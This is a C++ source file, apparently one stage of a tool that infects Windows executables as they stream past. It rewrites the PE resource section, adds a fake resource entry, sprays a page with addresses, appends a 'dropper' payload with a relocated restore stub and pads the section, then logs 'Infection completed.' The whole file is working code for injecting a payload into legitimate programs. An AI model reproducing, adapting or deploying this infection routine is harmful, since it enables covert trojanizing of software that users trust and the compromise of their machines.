/*
 * InjectDropper.cpp
 *
 *  Created on: May 7, 2010
 *      Author: daniele
 */

#include "Parsing.h"

void InjectDropper::init()
{
	// RCSDropper& dropper = context<StreamingMelter>().dropper();
	ImageSectionHeader& section = context<StreamingMelter>().resourceSection();
	neededBytes() = section->SizeOfRawData;
	triggeringOffset() = context<StreamingMelter>().currentOffset();
}

StateResult InjectDropper::parse()
{
	return PARSED;
}

StateResult InjectDropper::process()
{
	ImageSectionHeader& section = context<StreamingMelter>().resourceSection();

	char filler[0x1000];
	memset(filler, 0x41, 0x1000);

	char *pRsrcBuffer = context<StreamingMelter > ().buffer()->data();
	PIMAGE_RESOURCE_DIRECTORY pOriginalRootDir = (PIMAGE_RESOURCE_DIRECTORY)pRsrcBuffer;
	PIMAGE_RESOURCE_DIRECTORY_ENTRY pOriginalFirstEntry = (PIMAGE_RESOURCE_DIRECTORY_ENTRY) (pOriginalRootDir + 1);
	PIMAGE_RESOURCE_DIRECTORY pOriginalFirstTable = (PIMAGE_RESOURCE_DIRECTORY) (pRsrcBuffer + pOriginalFirstEntry->OffsetToDirectory);
	pOriginalFirstEntry->OffsetToDirectory = section->SizeOfRawData;
	pOriginalFirstTable->NumberOfIdEntries += 1;

	unsigned int uDirSize = sizeof(IMAGE_RESOURCE_DIRECTORY) + (sizeof(IMAGE_RESOURCE_DIRECTORY_ENTRY) * (pOriginalFirstTable->NumberOfIdEntries + pOriginalFirstTable->NumberOfNamedEntries));
	memset(filler, 0x0, 0x1000);
	memcpy(filler, pOriginalFirstTable, uDirSize);

	PIMAGE_RESOURCE_DIRECTORY_ENTRY pFakeEntry = (PIMAGE_RESOURCE_DIRECTORY_ENTRY) (filler + uDirSize);
	pFakeEntry->DataIsDirectory = 0;
	pFakeEntry->NameIsString = 0;
	pFakeEntry->Id = 10;
	pFakeEntry->OffsetToData = section->SizeOfRawData + uDirSize + sizeof(IMAGE_RESOURCE_DIRECTORY_ENTRY);

	PIMAGE_RESOURCE_DATA_ENTRY pFakeDataEntry = (PIMAGE_RESOURCE_DATA_ENTRY) (filler + uDirSize + sizeof(IMAGE_RESOURCE_DIRECTORY_ENTRY));
	// FIXME why align????
	pFakeDataEntry->Size = alignTo(section->SizeOfRawData + uDirSize + sizeof(IMAGE_RESOURCE_DIRECTORY_ENTRY) + sizeof(IMAGE_RESOURCE_DATA_ENTRY), context<StreamingMelter>().fileAlignment());

	
	
	
	
	context<StreamingMelter>().complete( section->SizeOfRawData );
	DEBUG_MSG(D_VERBOSE, "Sending resource data: %d", (DWORD) section->SizeOfRawData);

	

	// relocate restore stub with currentOffset
	Dropper& dropper = context<StreamingMelter>().dropper();
	dropper.restoreStub( context<StreamingMelter>().currentVA() );


	unsigned int uOutpuBufferLen = alignTo(uDirSize + sizeof(IMAGE_RESOURCE_DIRECTORY_ENTRY) + sizeof(IMAGE_RESOURCE_DATA_ENTRY), 4);
	for (unsigned int i=uOutpuBufferLen; i<0x1000; i+=4)
		*(unsigned int *)(filler + i) = context<StreamingMelter>().currentVA() + 0x1500;
	context<StreamingMelter>().complete(filler, 0x1000);



	std::size_t dropperSize = dropper.size() - 0x1000;
	//std::size_t dropperSize = dropper.size();
	context<StreamingMelter>().complete(dropper.data(), dropperSize);
	DEBUG_MSG(D_INFO, "Injecting dropper size: %d", (DWORD) dropperSize);



	DWORD sentSectionSize = section->SizeOfRawData + dropperSize;
	DWORD fileAlignment = context<StreamingMelter>().fileAlignment();
	DWORD predictedSectionSize = alignTo(section->SizeOfRawData + dropperSize, fileAlignment);
	DEBUG_MSG(D_INFO, "Predicted resource size: %d", predictedSectionSize);
	DWORD missingBytesToPredictedSize = predictedSectionSize - sentSectionSize;
	DEBUG_MSG(D_INFO, "Missing bytes to predicted size: %d", missingBytesToPredictedSize);

	std::vector<char> padding(missingBytesToPredictedSize, 0);
	context<StreamingMelter>().complete( &padding[0], missingBytesToPredictedSize);
	DEBUG_MSG(D_INFO, "Injecting padding size: %d", (DWORD) missingBytesToPredictedSize);
	DEBUG_MSG(D_INFO, "Infection completed.");

	offsetToNext() = currentOffset() + neededBytes();

	return PROCESSED;
}

sc::result InjectDropper::transitToNext()
{
	return transit< Defective >();
}

InjectDropper::InjectDropper()
	: DataState< InjectDropper, Parsing >()
{
	// TODO Auto-generated constructor stub

}

InjectDropper::~InjectDropper()
{
	// TODO Auto-generated destructor stub
}
